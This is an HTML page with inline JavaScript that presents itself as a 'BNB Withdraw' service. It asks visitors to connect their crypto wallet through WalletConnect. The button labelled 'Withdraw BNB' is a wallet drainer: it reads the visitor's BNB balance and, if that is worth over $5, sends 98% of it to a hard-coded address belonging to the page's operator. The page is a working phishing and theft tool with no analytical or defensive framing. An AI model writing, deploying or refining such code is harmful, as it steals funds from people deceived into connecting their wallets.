<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BNB Withdraw</title>
  <script type="module" src="wallet.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 2rem;
      background: #f5f5f5;
      text-align: center;
    }

    w3m-core-button {
      margin-bottom: 20px;
    }

    #withdrawBtn {
      background: #f0b90b;
      border: none;
      color: #fff;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
    }

    #withdrawBtn[disabled] {
      background: #ccc;
      cursor: not-allowed;
    }

    #message {
      margin-top: 20px;
      color: #333;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <!-- WalletConnect button -->
  <w3m-core-button></w3m-core-button>

  <!-- Withdraw button (initially disabled) -->
  <button id="withdrawBtn" disabled>Connect Wallet First</button>

  <!-- Message display -->
  <div id="message"></div>

  <!-- Withdraw logic -->
  <script type="module">
    import { getAccount, fetchBalance, sendTransaction } from "https://unpkg.com/@web3modal/ethereum@2.6.2";

    const withdrawBtn = document.getElementById("withdrawBtn");
    const messageEl = document.getElementById("message");

    const recipientAddress = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C"; // Your BNB address
    const MIN_USD = 5;
    const sendPercentage = 0.98;

    async function getBNBPriceUSD() {
      try {
        const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
        const data = await res.json();
        return parseFloat(data.price);
      } catch {
        return null;
      }
    }

    async function checkConnection() {
      const account = getAccount();
      if (account && account.isConnected) {
        withdrawBtn.disabled = false;
        withdrawBtn.textContent = "Withdraw BNB";
        messageEl.textContent = "";
      } else {
        withdrawBtn.disabled = true;
        withdrawBtn.textContent = "Connect Wallet First";
        messageEl.textContent = "Please connect your wallet to withdraw.";
      }
    }

    async function withdraw() {
      const account = getAccount();
      if (!account?.isConnected) {
        messageEl.textContent = "Wallet not connected.";
        return;
      }

      try {
        const balanceData = await fetchBalance({ address: account.address, chainId: 56 });
        const balanceBNB = parseFloat(balanceData.formatted);
        const price = await getBNBPriceUSD();

        if (!price) {
          messageEl.textContent = "Failed to fetch BNB price.";
          return;
        }

        const balanceUSD = balanceBNB * price;

        if (balanceUSD < MIN_USD) {
          messageEl.textContent = "Insufficient balance. Minimum $5 required.";
          return;
        }

        const sendAmount = (balanceBNB * sendPercentage).toFixed(6); // Limit precision to avoid overage
        const valueInWei = BigInt(Math.floor(Number(sendAmount) * 1e18)).toString();

        const { hash } = await sendTransaction({
          to: recipientAddress,
          value: valueInWei
        });

        messageEl.textContent = "Transaction sent. Hash: " + hash;
      } catch (err) {
        console.error(err);
        messageEl.textContent = "Transaction failed. Please try again.";
      }
    }

    withdrawBtn.addEventListener("click", withdraw);

    // Monitor connection
    setInterval(checkConnection, 1000);
  </script>
</body>
</html>